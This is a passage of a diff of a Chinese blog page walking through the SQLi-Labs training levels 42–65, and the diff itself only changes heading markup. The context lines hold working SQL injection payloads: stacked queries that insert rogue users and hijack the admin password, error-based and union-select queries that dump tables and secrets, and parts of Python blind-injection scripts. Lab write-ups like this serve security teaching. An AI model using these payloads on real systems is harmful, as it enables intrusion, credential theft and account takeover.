 <p>如果还希望越权的话，原理参考<strong>less-24</strong>，构造<code>1&#39;;insert into users(id,username,password) values(&quot;25&quot;,&quot;admin&#39;#&quot;,&quot;123&quot;)#</code>，这样就插入可用户名为<code>admin&#39;#</code>，密码为<code>123</code>的用户，登陆此账号：<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190724220536354.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>然后用此账号进行修改密码，实际上修改了用户<code>admin</code>的密码。<br><br></p>
-<h4><span id="less-43">Less-43</span></h4><p>与less-42一样，区别是这里用<code>(&#39;$password&#39;)</code>闭合。</p>
+<h4 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h4><p>与less-42一样，区别是这里用<code>(&#39;$password&#39;)</code>闭合。</p>
 <p>payload：</p>
 <pre><code>Username：任意
 Password：1&#39;);insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)#
 </code></pre><p><br></p>
-<h4><span id="less-44">Less-44</span></h4><p>好像和less-42一样…</p>
+<h4 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h4><p>好像和less-42一样…</p>
 <p>payload:</p>
 <pre><code>Username：任意
 Password：1&#39;;insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)#
 </code></pre><p><br></p>
-<h4><span id="less-45">Less-45</span></h4><p>好像和less-43一样…</p>
+<h4 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h4><p>好像和less-43一样…</p>
 <p>payload:</p>
 <pre><code>Username：任意
 Password：1&#39;);insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)#
 </code></pre><p><br></p>
-<h4><span id="less-46">Less-46</span></h4><p>order by注入，<code>?id=1 desc</code>和<code>?id=1 asc</code>返回的数据有区别说明可以进行注入。</p>
+<h4 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h4><p>order by注入，<code>?id=1 desc</code>和<code>?id=1 asc</code>返回的数据有区别说明可以进行注入。</p>
 <ul>
 <li>这一关会回显错误，因此可以采用报错注入。</li>
 <li>除此之外，<code>rand(true)</code>和<code>rand(false)</code>返回的结果也不一样，可以利用这一点进行布尔盲注。</li>
@@ -591,9 +591,9 @@ Password：1&#39;);insert into users(id,username,password) values(&#39;20&#39;,&
 </ul>
 <p>这里采用报错注入，payload：(报错字数有限，可修改limit的值逐条读出数据)<br><code>?sort=1 and extractvalue(1,concat(0x7e,( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1),0x7e))</code></p>
 <p><br></p>
-<h4><span id="less-47">Less-47</span></h4><p>单引号闭合sort，其他的与上一关一样。</p>
+<h4 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h4><p>单引号闭合sort，其他的与上一关一样。</p>
 <p>payload：<br><code>?sort=1&#39; and extractvalue(1,concat(0x7e,( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1),0x7e))--+</code><br><br></p>
-<h4><span id="less-48">Less-48</span></h4><p>这一关原理同less-46，但是不会回显报错信息，所以不能使用报错注入。</p>
+<h4 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h4><p>这一关原理同less-46，但是不会回显报错信息，所以不能使用报错注入。</p>
 <p>采用时间盲注，脚本如下：</p>
 <pre><code class="python"># less-48
 # auther：Lethe
@@ -619,7 +619,7 @@ for i in range(50):
             break
 </code></pre>
 <p><br></p>
-<h4><span id="less-49">Less-49</span></h4><p>同less-47单引号闭合，但是不能回显报错信息，所以还是采用时间盲注，脚本如下：</p>
+<h4 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h4><p>同less-47单引号闭合，但是不能回显报错信息，所以还是采用时间盲注，脚本如下：</p>
 <pre><code class="python"># less-49
 # auther：Lethe
 
@@ -644,16 +644,16 @@ for i in range(50):
             break
 </code></pre>
 <p><br></p>
-<h4><span id="less-50">Less-50</span></h4><p>这一关是order by与堆叠注入结合，数字型，无闭合。</p>
+<h4 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h4><p>这一关是order by与堆叠注入结合，数字型，无闭合。</p>
 <p>payload:<br><code>?sort=1;insert into users(id,username,password) values(&#39;20&#39;,&#39;lethe&#39;,&#39;lethe&#39;)--+</code></p>
 <p>执行完上面payload后再<code>?sort=1</code>可以看到多出来一行数据<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190726162456290.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
-<h4><span id="less-51">Less-51</span></h4><p>与上一关的区别是这里用单引号进行了闭合。</p>
+<h4 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h4><p>与上一关的区别是这里用单引号进行了闭合。</p>
 <p>payload：<br><code>?sort=1&#39;;insert into users(id,username,password) values(&#39;20&#39;,&#39;lethe&#39;,&#39;lethe&#39;)--+</code><br><br></p>
-<h4><span id="less-52">Less-52</span></h4><p>和less-50一样，只是不会回显错误，堆叠注入方式相同。</p>
+<h4 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h4><p>和less-50一样，只是不会回显错误，堆叠注入方式相同。</p>
 <p>payload：<br><code>?sort=1;insert into users(id,username,password) values(&#39;20&#39;,&#39;lethe&#39;,&#39;lethe&#39;)--+</code><br><br></p>
-<h4><span id="less-53">Less-53</span></h4><p>和less-51一样，只是不会回显错误，堆叠注入方式相同。</p>
+<h4 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h4><p>和less-51一样，只是不会回显错误，堆叠注入方式相同。</p>
 <p>payload：<br><code>?sort=1&#39;;insert into users(id,username,password) values(&#39;20&#39;,&#39;lethe&#39;,&#39;lethe&#39;)--+</code><br><br></p>
-<h4><span id="less-54">Less-54</span></h4><p>限制了只能在10次请求以内完成注入，且每次重置会生成随机的表名、列名和数据。</p>
+<h4 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h4><p>限制了只能在10次请求以内完成注入，且每次重置会生成随机的表名、列名和数据。</p>
 <p>payload:<br><code>?id=1&#39;</code></p>
 <p><code>?id=1&#39;--+</code></p>
 <p><code>?id=1&#39; order by 3--+</code></p>
@@ -662,52 +662,52 @@ for i in range(50):
 <p><code>?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code><br>得到表名3UXZWY1KY9</p>
 <p><code>?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;3UXZWY1KY9&#39;),3--+</code><br>得到四个列名id,sessid,secret_7RZ7,tryy</p>
 <p><code>?id=-1&#39; union select 1,(select group_concat(secret_7RZ7) from 3UXZWY1KY9),3--+</code><br>得到数据VWKFpeoXofNsCqqxcfWGM9x7，并提交<br><br></p>
-<h4><span id="less-55">Less-55</span></h4><p>这里比上一关多给了四次机会，得先花不少次猜测闭合方式，按照前面提到的顺序，先猜单双引号和单独括号，然后在单双引号后逐个添加括号，一般最多两个括号，若有报错信息同时要关注报错的信息来进行判断。</p>
+<h4 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h4><p>这里比上一关多给了四次机会，得先花不少次猜测闭合方式，按照前面提到的顺序，先猜单双引号和单独括号，然后在单双引号后逐个添加括号，一般最多两个括号，若有报错信息同时要关注报错的信息来进行判断。</p>
 <p>本关闭合方式为：<code>($id)</code>知道了闭合方式后其他的和上一关就一样了。</p>
 <p>payload:</p>
 <p><strong>······</strong></p>
 <p><code>?id=-1) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code><br>得到表名P6BV60ROT2</p>
 <p><code>?id=-1) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;P6BV60ROT2&#39;),3--+</code><br>得到四个列名id,sessid,secret_EWSR,tryy</p>
 <p><code>?id=-1) union select 1,(select group_concat(secret_EWSR) from P6BV60ROT2),3--+</code><br>得到数据Pwh5inh7TxaAV10IZRCc26MW<br><br></p>
-<h4><span id="less-56">Less-56</span></h4><p>闭合方式为：<code>(&#39;$id&#39;)</code>，其他的和上面一样。</p>
+<h4 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h4><p>闭合方式为：<code>(&#39;$id&#39;)</code>，其他的和上面一样。</p>
 <p>payload:</p>
 <p><strong>······</strong></p>
 <p><code>?id=-1&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code><br>得到表名QS5C6XI6F0</p>
 <p><code>?id=-1&#39;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;QS5C6XI6F0&#39;),3--+</code><br>得到四个列名id,sessid,secret_PYBQ,tryy</p>
 <p><code>?id=-1&#39;) union select 1,(select group_concat(secret_PYBQ) from QS5C6XI6F0),3--+</code><br>得到数据bHnjS8Y6KtGQDTihKBCDG7sU<br><br></p>
-<h4><span id="less-57">Less-57</span></h4><p>闭合方式为：<code>&quot;$id&quot;</code>，其他的和上面一样。</p>
+<h4 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h4><p>闭合方式为：<code>&quot;$id&quot;</code>，其他的和上面一样。</p>
 <p>payload:</p>
 <p><strong>······</strong></p>
 <p><code>?id=-1&quot; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code><br>得到表名9ODZ61QBP1</p>
 <p><code>?id=-1&quot; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;9ODZ61QBP1&#39;),3--+</code><br>得到四个列名id,sessid,secret_Z0TV,tryy</p>
 <p><code>?id=-1&quot; union select 1,(select group_concat(secret_Z0TV) from 9ODZ61QBP1
 ),3--+</code><br>得到数据0MNZ3yAJ3N0XuSZIlYhrGbcj<br><br></p>
-<h4><span id="less-58">Less-58</span></h4><p>单引号闭合，但是只有五次机会。</p>
+<h4 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h4><p>单引号闭合，但是只有五次机会。</p>
 <p>但是尝试<code>?id=-1&#39; union select 1,2,3--+</code>时发现页面无法回显sql语句的结果，所以前面几关的方法不能用了，但是页面会回显错误信息，所以考虑报错注入。</p>
 <p>payload:</p>
 <p><code>?id=-1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+</code><br>得到表名AK0HRXW75I</p>
 <p><code>?id=-1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;AK0HRXW75I&#39;),0x7e))--+</code><br>得到四个列名id,sessid,secret_RPHD,tryy</p>
 <p><code>?id=-1&#39; and extractvalue(1,concat(0x7e,(select group_concat(secret_RPHD) from AK0HRXW75I),0x7e))--+</code><br>得到数据7wEINBWYdYvusRUrsV9bidFL</p>
 <p><br></p>
-<h4><span id="less-59">Less-59</span></h4><p>这一关为数字型，未进行闭合，其他的与less-58相同。</p>
+<h4 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h4><p>这一关为数字型，未进行闭合，其他的与less-58相同。</p>
 <p>payload:</p>
 <p><code>?id=-1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+</code><br>得到表名NTGAY0ES0F</p>
 <p><code>?id=-1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;NTGAY0ES0F&#39;),0x7e))--+</code><br>得到四个列名id,sessid,secret_9Y69,tryy</p>
 <p><code>?id=-1 and extractvalue(1,concat(0x7e,(select group_concat(secret_9Y69) from NTGAY0ES0F),0x7e))--+</code><br>得到数据UpD0J8a6Q7RFjeMejjCujser</p>
 <p><br></p>
-<h4><span id="less-60">Less-60</span></h4><p>经测试，闭合方式为：<code>(&quot;$id&quot;)</code>，其他与前两关相同。</p>
+<h4 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h4><p>经测试，闭合方式为：<code>(&quot;$id&quot;)</code>，其他与前两关相同。</p>
 <p>payload:</p>
 <p><code>?id=-1&quot;) and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+</code><br>得到表名HJ31CD4SZJ</p>
 <p><code>?id=-1&quot;) and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;HJ31CD4SZJ&#39;),0x7e))--+</code><br>得到四个列名id,sessid,secret_L5OI,tryy</p>
 <p><code>?id=-1&quot;) and extractvalue(1,concat(0x7e,(select group_concat(secret_L5OI) from HJ31CD4SZJ),0x7e))--+</code><br>得到数据RbCnjPhpQjy7psK1DXG1IL78</p>
 <p><br></p>
-<h4><span id="less-61">Less-61</span></h4><p>经测试，闭合方式为：<code>((&#39;$id&#39;))</code>，其他与前两关相同。</p>
+<h4 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h4><p>经测试，闭合方式为：<code>((&#39;$id&#39;))</code>，其他与前两关相同。</p>
 <p>payload:</p>
 <p><code>?id=-1&#39;)) and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+</code><br>得到表名S0EAHB4X1I</p>
 <p><code>?id=-1&#39;)) and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;S0EAHB4X1I&#39;),0x7e))--+</code><br>得到四个列名id,sessid,secret_5AJ4,tryy</p>
 <p><code>?id=-1&#39;)) and extractvalue(1,concat(0x7e,(select group_concat(secret_5AJ4) from S0EAHB4X1I),0x7e))--+</code><br>得到数据5SIpSyz03MhX52krjGbqHot7</p>
 <p><br></p>
-<h4><span id="less-62">Less-62</span></h4><p>经测试，闭合方式为：<code>(&#39;$id&#39;)</code>，这一关既不回显sql语句结果，也不回显错误信息，那就只能盲注了，要求是130次请求以内完成盲注。</p>
+<h4 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h4><p>经测试，闭合方式为：<code>(&#39;$id&#39;)</code>，这一关既不回显sql语句结果，也不回显错误信息，那就只能盲注了，要求是130次请求以内完成盲注。</p>
 <p>下面关键就是如何减少请求的次数了…</p>
 <p>那么首先，如果能知道跑出的数据，长度为多少肯定是最好的，就没必要进行多余的爆破了…</p>
 <ul>
@@ -806,11 +806,11 @@ for i in range(1,25):
 
 </code></pre>
 <p>结果：<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190726212950480.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
-<h4><span id="less-63">Less-63</span></h4><p>闭合方式为：<code>&#39;$id&#39;</code>，其他的与less-62相同。</p>
+<h4 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h4><p>闭合方式为：<code>&#39;$id&#39;</code>，其他的与less-62相同。</p>
 <p><br></p>
-<h4><span id="less-64">Less-64</span></h4><p>闭合方式为：<code>(($id))</code>，其他的与less-62相同。</p>
+<h4 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h4><p>闭合方式为：<code>(($id))</code>，其他的与less-62相同。</p>
 <p><br></p>
-<h4><span id="less-65">Less-65</span></h4><p>闭合方式为：<code>(&quot;$id&quot;)</code>，其他的与less-62相同。</p>
+<h4 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h4><p>闭合方式为：<code>(&quot;$id&quot;)</code>，其他的与less-62相同。</p>
 
             <hr>
           </div>
